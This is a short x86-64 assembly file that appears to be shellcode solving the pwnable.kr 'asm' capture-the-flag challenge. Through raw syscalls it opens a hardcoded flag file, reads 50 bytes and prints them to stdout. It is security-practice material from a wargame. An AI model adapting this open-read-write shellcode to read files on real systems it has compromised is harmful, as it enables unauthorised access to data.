BITS 64
	mov rax,2
	lea rdi,[rel flag_addr]
	mov rsi,0
	mov rdx,0
	syscall
	
	mov rdi,rax
	mov rax,0
	lea rsi,[rel buffer]
	mov rdx,50
	syscall
	
	mov rax,1
	mov rdi,1
	lea rsi,[rel buffer]
	mov rdx,50
	syscall



flag_addr:
	db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0
	
buffer:
	times 50 db 0
